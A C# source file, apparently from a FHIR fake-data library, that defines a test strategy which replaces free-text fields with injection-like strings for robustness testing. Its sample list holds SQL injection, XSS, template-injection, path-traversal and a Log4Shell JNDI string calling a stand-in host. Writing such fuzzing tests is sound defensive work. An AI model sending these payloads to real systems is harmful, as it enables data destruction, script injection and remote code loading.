// -------------------------------------------------------------------------------------------------
// Copyright (c) Ignixa Contributors. All rights reserved.
// Licensed under the MIT License (MIT). See LICENSE in the repo root for license information.
// -------------------------------------------------------------------------------------------------

using System.Diagnostics.CodeAnalysis;
using Bogus;

namespace Ignixa.FhirFakes.EdgeCases.Strategies;

/// <summary>
/// Replaces a free-text value with text that resembles SQL, HTML, or template injection payloads.
/// The value remains valid FHIR <c>string</c> content — this is robustness testing of downstream
/// rendering and storage layers, not a security feature or an attack.
/// </summary>
[SuppressMessage("Security", "CA5394:Do not use insecure randomness", Justification = "Random is used for test data generation only")]
public sealed class InjectionLikeStringStrategy : StringBoundaryEdgeCaseStrategy
{
    private static readonly string[] Samples =
    [
        """'; DROP TABLE patients;--""",
        """<script>alert(1)</script>""",
        """${jndi:ldap://evil.example/a}""",
        """{{7*7}}""",
        """<img src=x onerror=alert(1)>""",
        """' OR '1'='1""",
        // Deliberately literal backslash sequences (the characters \, x, 0, ...), NOT real control
        // bytes — this is injection-LOOKING free text that stays valid FHIR string. Actual control
        // characters belong to ControlCharsStringStrategy.
        """\x00\x1b[31mRED\x1b[0m""",
        """../../etc/passwd""",
    ];

    /// <inheritdoc />
    public override string Category => "string.injection-like";

    /// <inheritdoc />
    public override ValidityIntent Intent => ValidityIntent.PreservesValidity;

    /// <inheritdoc />
    public override MutationResult Apply(MutationTarget target, Randomizer rng)
    {
        ArgumentNullException.ThrowIfNull(target);
        ArgumentNullException.ThrowIfNull(rng);
        var value = rng.ArrayElement(Samples);
        return new MutationResult(value, "Replaced free-text with an injection-like payload for robustness testing");
    }
}
